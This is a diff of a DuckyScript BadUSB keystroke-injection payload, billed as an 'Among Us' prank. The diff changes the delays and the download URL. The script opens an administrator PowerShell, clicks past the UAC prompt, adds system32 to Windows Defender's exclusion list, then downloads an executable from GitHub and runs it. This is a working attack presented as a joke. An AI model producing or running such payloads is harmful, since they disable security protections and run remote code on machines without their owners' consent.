@@ -2,18 +2,18 @@ REM Author: AGO061
 REM Description: AmongUs takes over the PC!!!
 REM Version: 1.0
 REM Category: FUN
-DELAY 500
+DELAY 2000
 GUI r
-DELAY 500
+DELAY 2000
 STRING powershell Start-Process powershell -Verb runAs
 CTRL-SHIFT ENTER
-DELAY 1500
+DELAY 2000
 SHIFT TAB
-DELAY 500
+DELAY 2000
 ENTER
-DELAY 1500
+DELAY 2000
 STRING Add-MpPreference -ExclusionPath C:\Windows\system32
 ENTER
-DELAY 500
-STRING $down=New-Object System.Net.WebClient;$url='https://github.com/AGO061/badusb-payloads/releases/download/SUS-R1/sus.exe';$file='sus.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
+DELAY 2000
+STRING $down=New-Object System.Net.WebClient;$url='https://github.com/nullze/Flipper-Zero-BadKB-Files/raw/main/Windows/Pranks/Files/sus.exe';$file='sus.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
 ENTER
